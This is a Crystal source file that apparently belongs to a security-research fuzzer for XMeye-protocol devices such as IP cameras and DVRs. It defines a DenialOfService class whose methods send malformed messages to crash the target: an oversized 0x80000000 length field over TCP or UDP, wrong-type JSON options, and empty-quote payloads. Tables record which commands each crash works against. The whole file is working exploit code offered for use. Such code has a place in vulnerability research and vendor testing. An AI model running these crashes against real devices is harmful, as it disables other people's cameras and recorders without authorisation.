require "./magic_fuzzer"

class DenialOfService  

  def self.sandbox(target_ip, port = 34567, command = Command::Login)
    success = false
    begin
      socket = XMSocketTCP.new(target_ip, port)
      xmm = Command::Login.new
      xmm.message = "{\"Name\":\"OPTalk\", \"SessionID\": {}"
      socket.send_message xmm
      socket.receive_message
    rescue e : XMError::ReceiveEOF
      success = true
    rescue e
      # supress
    end
    success
  end


  SIZE_INT_COMMANDS_TESTED = {
    # Command => Worked?
    Command::Login => true,
    Command::KeepAlive => false,
    Command::OPMonitor => true,
    Command::GetSafetyAbility => true,
    Command::OPPlayback => true,
    Command::OPTalk => true,
    Command::OPRecordSnap => true,
    # TODO: FIND OUT WHAT THIS DOES
    Command::Unknown => true
  }
  # This one involves overflowing an Int32 with a high UInt32. Values above 0x80000000 will cause a crash due to negative size
  def self.use_size_int(target_ip, connection_type = :tcp, port = 34567, command = Command::Login::Request)
    success = false

    xmm = command.new
    xmm.size = 0x80000000
    xmm.message = ""
    xmm.use_custom_size = true


    if connection_type == :tcp
      begin
        socket = XMSocketTCP.new(target_ip, port)
        socket.send_message xmm
        socket.receive_message
      rescue e : XMError::ReceiveEOF
        success = true
      rescue e
        # supress
      end
    elsif connection_type == :udp
      begin
        socket = XMSocketUDP.new(target_ip, port)
        socket.send_message xmm
        socket.receive_message
      rescue e : XMError::ReceiveEOF
        success = true
      rescue e : XMError::ReceiveTimeout
        success = true
      rescue e
        # supress
      end
    end
    success
  end

  WRONG_TYPE_COMMANDS_TESTED = {
    # Command => Worked?
    Command::Login => false,
    Command::KeepAlive => false,
    Command::OPMonitor => true,
    Command::GetSafetyAbility => false,
    Command::OPPlayback => false,
    Command::OPTalk => true,
    Command::OPRecordSnap => true,
  }

  # This one causes OPMonitor to crash because it expects the key OPMonitor to be a nested hash, not a number, or string.
  def self.use_options_wrong_type(target_ip, port = 34567, command = Command::OPMonitor)
    success = false

    begin
      socket = XMSocketTCP.new(target_ip, port)
      xmm = command.new
      xmm.message = "{\"#{command.to_s.split("::")[1]}\":0}"
      socket.send_message xmm
      socket.receive_message
    rescue e : XMError::ReceiveEOF
      success = true
    rescue e
      # supress
    end
    success
  end

  MESSAGE_QUOTES_COMMANDS_TESTED = {
    # Command => Worked?
    Command::Login => true,
    Command::KeepAlive => true,
    Command::OPMonitor => true,
    Command::GetSafetyAbility => true,
    Command::OPPlayback => true,
    Command::OPTalk => true,
    Command::OPRecordSnap => true,
    Command::Unknown => false,
  }
  def self.use_message_quotes(target_ip, port = 34567, command : XMMessage.class = Command::GetSafetyAbility)
    success = false
    begin
      socket = XMSocketTCP.new(target_ip, port)
      xmm = command.new
      xmm.message = "\"\""
      socket.send_message xmm
      socket.receive_message
    rescue e : XMError::ReceiveEOF
      success = true
    rescue e
      # supress
    end
    success
  end
end